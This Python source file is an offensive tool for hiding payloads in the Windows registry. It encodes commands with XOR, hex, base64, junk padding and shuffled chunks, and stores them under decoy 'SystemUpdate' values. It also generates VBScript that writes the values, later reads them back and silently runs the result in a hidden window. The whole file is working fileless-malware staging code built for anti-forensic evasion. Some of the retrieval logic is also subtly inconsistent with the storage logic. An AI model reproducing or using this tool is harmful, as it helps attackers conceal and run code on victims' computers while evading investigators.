#!/usr/bin/env python3
"""
Registry Value Obfuscator
Implements advanced obfuscation techniques for storing payloads in Windows registry:
- Binary data storage (REG_BINARY)
- Hex string encoding with chunking
- Split storage across multiple registry values
- Multi-layer encoding and scrambling
- Anti-forensic techniques
"""

import base64
import binascii
import struct
import random
import string
from typing import Dict, List, Tuple, Optional
from dataclasses import dataclass
from enum import Enum


class ObfuscationType(Enum):
    """Types of registry obfuscation strategies"""
    BINARY = "binary"           # Store as REG_BINARY (raw bytes)
    HEX_STRING = "hex_string"   # Store as hex string in REG_SZ
    SPLIT_VALUES = "split"      # Split across multiple registry values
    INTERLEAVED = "interleaved" # Interleave payload with junk data
    XORED = "xored"             # XOR encoding
    BASE64 = "base64"           # Base64 in registry
    CHUNKED_HEX = "chunked_hex" # Hex split into chunks


@dataclass
class ObfuscationConfig:
    """Configuration for registry obfuscation"""
    obfuscation_type: ObfuscationType = ObfuscationType.BINARY
    chunk_size: int = 128  # Size of chunks for split values
    add_junk_data: bool = True
    junk_ratio: float = 0.3  # Ratio of junk to payload
    xor_key: Optional[int] = None  # XOR key (random if None)
    scramble_order: bool = True  # Randomize chunk order
    compression: bool = False  # Use compression (future)


class RegistryObfuscator:
    """Main obfuscator for registry value hiding"""

    def __init__(self, config: Optional[ObfuscationConfig] = None):
        """Initialize obfuscator with configuration"""
        self.config = config or ObfuscationConfig()
        self.xor_key = self.config.xor_key or random.randint(1, 255)
        self.metadata: Dict = {}

    def obfuscate(self, payload: str) -> Dict:
        """
        Obfuscate payload according to configuration

        Returns:
            Dictionary containing:
            - 'type': obfuscation type used
            - 'registry_values': dict of value_name -> (data, reg_type)
            - 'metadata': metadata needed for deobfuscation
            - 'retrieval_code': VBS code to retrieve and deobfuscate
        """
        if self.config.obfuscation_type == ObfuscationType.BINARY:
            return self._obfuscate_binary(payload)
        elif self.config.obfuscation_type == ObfuscationType.HEX_STRING:
            return self._obfuscate_hex_string(payload)
        elif self.config.obfuscation_type == ObfuscationType.SPLIT_VALUES:
            return self._obfuscate_split_values(payload)
        elif self.config.obfuscation_type == ObfuscationType.INTERLEAVED:
            return self._obfuscate_interleaved(payload)
        elif self.config.obfuscation_type == ObfuscationType.XORED:
            return self._obfuscate_xored(payload)
        elif self.config.obfuscation_type == ObfuscationType.BASE64:
            return self._obfuscate_base64(payload)
        elif self.config.obfuscation_type == ObfuscationType.CHUNKED_HEX:
            return self._obfuscate_chunked_hex(payload)
        else:
            raise ValueError(f"Unknown obfuscation type: {self.config.obfuscation_type}")

    def _obfuscate_binary(self, payload: str) -> Dict:
        """Store payload as binary data (REG_BINARY)"""
        # Convert payload to bytes
        payload_bytes = payload.encode('utf-8')

        # Add junk data if configured
        if self.config.add_junk_data:
            junk_size = int(len(payload_bytes) * self.config.junk_ratio)
            junk = bytes(random.randint(0, 255) for _ in range(junk_size))
            # Store payload at random offset
            offset = random.randint(0, junk_size)
            payload_bytes = junk[:offset] + payload_bytes + junk[offset:]
        else:
            offset = 0

        # Create hex representation for storage
        hex_data = binascii.hexlify(payload_bytes).decode('ascii')

        return {
            'type': 'binary',
            'registry_values': {
                'PayloadData': (hex_data, 'REG_SZ'),  # VBS can't natively write binary
                'PayloadOffset': (str(offset), 'REG_SZ'),
                'PayloadSize': (str(len(payload)), 'REG_SZ'),
            },
            'metadata': {
                'original_size': len(payload),
                'data_offset': offset,
                'has_junk': self.config.add_junk_data,
            },
            'retrieval_code': self._gen_binary_retriever()
        }

    def _obfuscate_hex_string(self, payload: str) -> Dict:
        """Store as hex-encoded string in registry"""
        hex_payload = payload.encode('utf-8').hex()

        if self.config.add_junk_data:
            # Interleave junk bytes
            junk_ratio = self.config.junk_ratio
            result = ""
            i = 0
            while i < len(hex_payload):
                # Add payload hex
                chunk_len = max(2, int(4 / junk_ratio))
                result += hex_payload[i:i+chunk_len]
                i += chunk_len

                # Add junk hex bytes
                if i < len(hex_payload):
                    junk_len = random.randint(2, 4)
                    result += ''.join(random.choice('0123456789abcdef') for _ in range(junk_len))
            hex_payload = result

        return {
            'type': 'hex_string',
            'registry_values': {
                'PayloadHex': (hex_payload, 'REG_SZ'),
            },
            'metadata': {
                'original_size': len(payload),
                'has_junk': self.config.add_junk_data,
            },
            'retrieval_code': self._gen_hex_string_retriever()
        }

    def _obfuscate_split_values(self, payload: str) -> Dict:
        """Split payload across multiple registry values"""
        payload_bytes = payload.encode('utf-8')
        chunks = []
        junk_count = 0

        # Split into chunks
        chunk_size = self.config.chunk_size
        for i in range(0, len(payload_bytes), chunk_size):
            chunks.append(payload_bytes[i:i+chunk_size])

        # Optional: add junk chunks
        if self.config.add_junk_data:
            junk_count = max(1, int(len(chunks) * self.config.junk_ratio))
            for _ in range(junk_count):
                junk = bytes(random.randint(0, 255) for _ in range(chunk_size))
                chunks.append(junk)

        # Optional: scramble order
        chunk_order = list(range(len(chunks)))
        if self.config.scramble_order:
            random.shuffle(chunk_order)

        # Create registry values
        registry_values = {}
        for i, chunk_idx in enumerate(chunk_order):
            hex_chunk = binascii.hexlify(chunks[chunk_idx]).decode('ascii')
            registry_values[f'Chunk{i:03d}'] = (hex_chunk, 'REG_SZ')
            # Store original index for reassembly
            registry_values[f'Index{i:03d}'] = (str(chunk_idx), 'REG_SZ')

        registry_values['ChunkCount'] = (str(len(chunks) - junk_count), 'REG_SZ')

        return {
            'type': 'split_values',
            'registry_values': registry_values,
            'metadata': {
                'chunk_count': len(chunks) - junk_count,
                'total_chunks': len(chunks),
                'chunk_order': chunk_order,
                'original_size': len(payload),
                'chunk_size': chunk_size,
                'has_junk': self.config.add_junk_data,
            },
            'retrieval_code': self._gen_split_values_retriever()
        }

    def _obfuscate_interleaved(self, payload: str) -> Dict:
        """Interleave payload with junk data"""
        payload_bytes = payload.encode('utf-8')
        interleaved = bytearray()

        junk_size = int(len(payload_bytes) * self.config.junk_ratio)

        for i, byte in enumerate(payload_bytes):
            interleaved.append(byte)
            if random.random() < self.config.junk_ratio:
                interleaved.append(random.randint(0, 255))

        # Create mask to identify payload bytes
        mask = []
        pos = 0
        for i, byte in enumerate(payload_bytes):
            mask.append(pos)
            pos += 1
            if i < len(payload_bytes) - 1 and random.random() < self.config.junk_ratio:
                pos += 1

        hex_data = binascii.hexlify(bytes(interleaved)).decode('ascii')
        mask_str = ','.join(map(str, mask))

        return {
            'type': 'interleaved',
            'registry_values': {
                'InterleavedData': (hex_data, 'REG_SZ'),
                'InterleavedMask': (mask_str, 'REG_SZ'),
            },
            'metadata': {
                'mask': mask,
                'original_size': len(payload),
            },
            'retrieval_code': self._gen_interleaved_retriever()
        }

    def _obfuscate_xored(self, payload: str) -> Dict:
        """XOR encode payload"""
        payload_bytes = payload.encode('utf-8')
        xored = bytes(b ^ self.xor_key for b in payload_bytes)
        hex_data = binascii.hexlify(xored).decode('ascii')

        return {
            'type': 'xored',
            'registry_values': {
                'XoredPayload': (hex_data, 'REG_SZ'),
                'XorKey': (str(self.xor_key), 'REG_SZ'),
            },
            'metadata': {
                'xor_key': self.xor_key,
                'original_size': len(payload),
            },
            'retrieval_code': self._gen_xored_retriever()
        }

    def _obfuscate_base64(self, payload: str) -> Dict:
        """Base64 encode and store in registry"""
        b64_payload = base64.b64encode(payload.encode('utf-8')).decode('ascii')

        # Split into chunks for obfuscation
        if self.config.add_junk_data:
            chunks = [b64_payload[i:i+64] for i in range(0, len(b64_payload), 64)]
        else:
            chunks = [b64_payload]

        registry_values = {}
        for i, chunk in enumerate(chunks):
            registry_values[f'Base64Part{i}'] = (chunk, 'REG_SZ')

        registry_values['Base64PartCount'] = (str(len(chunks)), 'REG_SZ')

        return {
            'type': 'base64',
            'registry_values': registry_values,
            'metadata': {
                'part_count': len(chunks),
                'original_size': len(payload),
            },
            'retrieval_code': self._gen_base64_retriever()
        }

    def _obfuscate_chunked_hex(self, payload: str) -> Dict:
        """Hex encode and split into chunks"""
        payload_bytes = payload.encode('utf-8')
        hex_str = binascii.hexlify(payload_bytes).decode('ascii')

        # Split into chunks
        chunk_size = self.config.chunk_size * 2  # 2 hex chars per byte
        chunks = [hex_str[i:i+chunk_size] for i in range(0, len(hex_str), chunk_size)]

        registry_values = {}
        for i, chunk in enumerate(chunks):
            registry_values[f'HexChunk{i:03d}'] = (chunk, 'REG_SZ')

        registry_values['HexChunkCount'] = (str(len(chunks)), 'REG_SZ')

        return {
            'type': 'chunked_hex',
            'registry_values': registry_values,
            'metadata': {
                'chunk_count': len(chunks),
                'original_size': len(payload),
                'chunk_size': chunk_size // 2,
            },
            'retrieval_code': self._gen_chunked_hex_retriever()
        }

    # VBS Retriever Code Generators
    def _gen_binary_retriever(self) -> str:
        """Generate VBS code to retrieve binary obfuscated payload"""
        return """
Function RetrieveBinaryPayload(shell, regPath)
    Dim offset, size, hexData, i, result, byteVal

    hexData = shell.RegRead(regPath & "\\PayloadData")
    offset = CLng(shell.RegRead(regPath & "\\PayloadOffset"))
    size = CLng(shell.RegRead(regPath & "\\PayloadSize"))

    ' Convert hex string to bytes
    Dim byteArray()
    ReDim byteArray(Len(hexData) / 2 - 1)

    For i = 0 To UBound(byteArray)
        byteArray(i) = CLng("&H" & Mid(hexData, i * 2 + 1, 2))
    Next

    ' Extract payload from offset
    result = ""
    For i = 0 To size - 1
        result = result & Chr(byteArray(offset + i))
    Next

    RetrieveBinaryPayload = result
End Function
"""

    def _gen_hex_string_retriever(self) -> str:
        """Generate VBS code to retrieve hex string obfuscated payload"""
        return """
Function RetrieveHexStringPayload(shell, regPath)
    Dim hexData, result, i

    hexData = shell.RegRead(regPath & "\\PayloadHex")
    result = ""

    ' Decode hex string to ASCII
    For i = 1 To Len(hexData) Step 2
        On Error Resume Next
        result = result & Chr(CLng("&H" & Mid(hexData, i, 2)))
        On Error GoTo 0
    Next

    RetrieveHexStringPayload = result
End Function
"""

    def _gen_split_values_retriever(self) -> str:
        """Generate VBS code to retrieve split values payload"""
        return """
Function RetrieveSplitPayload(shell, regPath)
    Dim chunkCount, i, chunk, result, chunkIdx

    chunkCount = CLng(shell.RegRead(regPath & "\\ChunkCount"))
    result = ""

    For i = 0 To chunkCount - 1
        On Error Resume Next
        ' Read chunk and index
        chunk = shell.RegRead(regPath & "\\Chunk" & Right("00" & i, 3))

        ' Convert hex to ASCII
        Dim j, byteVal
        For j = 1 To Len(chunk) Step 2
            byteVal = CLng("&H" & Mid(chunk, j, 2))
            result = result & Chr(byteVal)
        Next
        On Error GoTo 0
    Next

    RetrieveSplitPayload = result
End Function
"""

    def _gen_interleaved_retriever(self) -> str:
        """Generate VBS code to retrieve interleaved payload"""
        return """
Function RetrieveInterleavedPayload(shell, regPath)
    Dim hexData, maskStr, i, result, byteVal
    Dim mask(), maskIdx, maskVal

    hexData = shell.RegRead(regPath & "\\InterleavedData")
    maskStr = shell.RegRead(regPath & "\\InterleavedMask")

    ' Parse mask array
    Dim maskParts
    maskParts = Split(maskStr, ",")
    ReDim mask(UBound(maskParts))
    For i = 0 To UBound(maskParts)
        mask(i) = CLng(maskParts(i))
    Next

    result = ""
    For maskIdx = 0 To UBound(mask)
        Dim bytePos
        bytePos = mask(maskIdx) * 2 + 1
        byteVal = CLng("&H" & Mid(hexData, bytePos, 2))
        result = result & Chr(byteVal)
    Next

    RetrieveInterleavedPayload = result
End Function
"""

    def _gen_xored_retriever(self) -> str:
        """Generate VBS code to retrieve XOR obfuscated payload"""
        return """
Function RetrieveXoredPayload(shell, regPath)
    Dim xorKey, hexData, i, result, byteVal

    xorKey = CLng(shell.RegRead(regPath & "\\XorKey"))
    hexData = shell.RegRead(regPath & "\\XoredPayload")

    result = ""
    For i = 1 To Len(hexData) Step 2
        byteVal = CLng("&H" & Mid(hexData, i, 2))
        result = result & Chr(byteVal Xor xorKey)
    Next

    RetrieveXoredPayload = result
End Function
"""

    def _gen_base64_retriever(self) -> str:
        """Generate VBS code to retrieve base64 obfuscated payload"""
        return """
Function RetrieveBase64Payload(shell, regPath)
    Dim partCount, i, b64Str, result, xmlDoc

    partCount = CLng(shell.RegRead(regPath & "\\Base64PartCount"))
    b64Str = ""

    ' Concatenate all parts
    For i = 0 To partCount - 1
        b64Str = b64Str & shell.RegRead(regPath & "\\Base64Part" & i)
    Next

    ' Decode using MSXML
    Set xmlDoc = CreateObject("MSXML2.DOMDocument")
    xmlDoc.LoadXML "<u><![CDATA[" & b64Str & "]]></u>"
    RetrieveBase64Payload = xmlDoc.DocumentElement.text
    Set xmlDoc = Nothing
End Function
"""

    def _gen_chunked_hex_retriever(self) -> str:
        """Generate VBS code to retrieve chunked hex payload"""
        return """
Function RetrieveChunkedHexPayload(shell, regPath)
    Dim chunkCount, i, chunk, result, j, byteVal

    chunkCount = CLng(shell.RegRead(regPath & "\\HexChunkCount"))
    result = ""

    For i = 0 To chunkCount - 1
        chunk = shell.RegRead(regPath & "\\HexChunk" & Right("00" & i, 3))

        ' Decode chunk
        For j = 1 To Len(chunk) Step 2
            byteVal = CLng("&H" & Mid(chunk, j, 2))
            result = result & Chr(byteVal)
        Next
    Next

    RetrieveChunkedHexPayload = result
End Function
"""


class RegistryStorageGenerator:
    """Generate complete VBS code for registry storage and retrieval"""

    def __init__(self, obfuscator: RegistryObfuscator):
        self.obfuscator = obfuscator

    def generate_storage_vbs(
        self,
        payload: str,
        registry_hive: str = "HKCU",
        registry_path: str = "Software\\Microsoft\\Windows\\CurrentVersion",
        value_prefix: str = "SystemUpdate"
    ) -> str:
        """Generate complete VBS for storing obfuscated payload"""

        # Obfuscate the payload
        obf_result = self.obfuscator.obfuscate(payload)
        registry_values = obf_result['registry_values']

        # Generate variable names
        shell_var = f"sh_{random.randint(1000, 9999)}"
        reg_path_var = f"rp_{random.randint(1000, 9999)}"

        # Map hive
        hive_constant = "HKEY_CURRENT_USER" if "HKCU" in registry_hive.upper() else "HKEY_LOCAL_MACHINE"

        # Build storage code
        vbs_code = f"""
Dim {shell_var}
Set {shell_var} = CreateObject("WScript.Shell")
Dim {reg_path_var}
{reg_path_var} = "{hive_constant}\\{registry_path}"

On Error Resume Next
"""

        # Write each registry value
        for value_name, (data, reg_type) in registry_values.items():
            full_value_name = f"{value_prefix}_{value_name}"
            vbs_code += f'{shell_var}.RegWrite {reg_path_var} & "\\{full_value_name}", "{data}", "{reg_type}"\n'

        vbs_code += """
On Error GoTo 0
Set shell_var = Nothing
"""
        return vbs_code.strip()

    def generate_retrieval_vbs(
        self,
        registry_hive: str = "HKCU",
        registry_path: str = "Software\\Microsoft\\Windows\\CurrentVersion",
        value_prefix: str = "SystemUpdate",
        auto_execute: bool = True
    ) -> str:
        """Generate complete VBS for retrieving and deobfuscating payload"""

        obf_type = self.obfuscator.config.obfuscation_type.value

        # Get the retriever function
        retriever_func = self.obfuscator.obfuscate("dummy")['retrieval_code']

        # Generate variable names
        shell_var = f"sh_{random.randint(1000, 9999)}"
        reg_path_var = f"rp_{random.randint(1000, 9999)}"
        payload_var = f"pl_{random.randint(1000, 9999)}"
        exec_var = f"ex_{random.randint(1000, 9999)}"

        # Map hive
        hive_constant = "HKEY_CURRENT_USER" if "HKCU" in registry_hive.upper() else "HKEY_LOCAL_MACHINE"

        # Build retrieval code
        vbs_code = retriever_func + f"""

Dim {shell_var}
Set {shell_var} = CreateObject("WScript.Shell")
Dim {reg_path_var}
{reg_path_var} = "{hive_constant}\\{registry_path}"

On Error Resume Next
Dim {payload_var}
{payload_var} = Retrieve{obf_type.title().replace('_', '')}Payload({shell_var}, {reg_path_var})
On Error GoTo 0

If Len({payload_var}) > 0 Then
"""

        if auto_execute:
            vbs_code += f"""
    Dim {exec_var}
    Set {exec_var} = CreateObject("WScript.Shell")
    {exec_var}.Run {payload_var}, 0, False
    Set {exec_var} = Nothing
"""

        vbs_code += """
End If

Set shell_var = Nothing
"""
        return vbs_code.strip()


def test_obfuscator():
    """Test all obfuscation types"""
    test_payload = "powershell.exe -Command 'Write-Host Test'"

    print("="*70)
    print("REGISTRY VALUE OBFUSCATION TEST SUITE")
    print("="*70)

    obfuscation_types = [
        ObfuscationType.BINARY,
        ObfuscationType.HEX_STRING,
        ObfuscationType.SPLIT_VALUES,
        ObfuscationType.INTERLEAVED,
        ObfuscationType.XORED,
        ObfuscationType.BASE64,
        ObfuscationType.CHUNKED_HEX,
    ]

    for obf_type in obfuscation_types:
        print(f"\n{'='*70}")
        print(f"Testing: {obf_type.value.upper()}")
        print(f"{'='*70}")

        config = ObfuscationConfig(
            obfuscation_type=obf_type,
            add_junk_data=True,
            chunk_size=64
        )

        obfuscator = RegistryObfuscator(config)
        result = obfuscator.obfuscate(test_payload)

        print(f"Payload: {test_payload}")
        print(f"\nRegistry Values:")
        for value_name, (data, reg_type) in result['registry_values'].items():
            print(f"  {value_name}: {reg_type}")
            if len(data) > 80:
                print(f"    {data[:80]}...")
            else:
                print(f"    {data}")

        print(f"\nMetadata: {result['metadata']}")
        print(f"\nRetrieval Function (first 200 chars):")
        print(f"  {result['retrieval_code'][:200]}...")


if __name__ == "__main__":
    test_obfuscator()
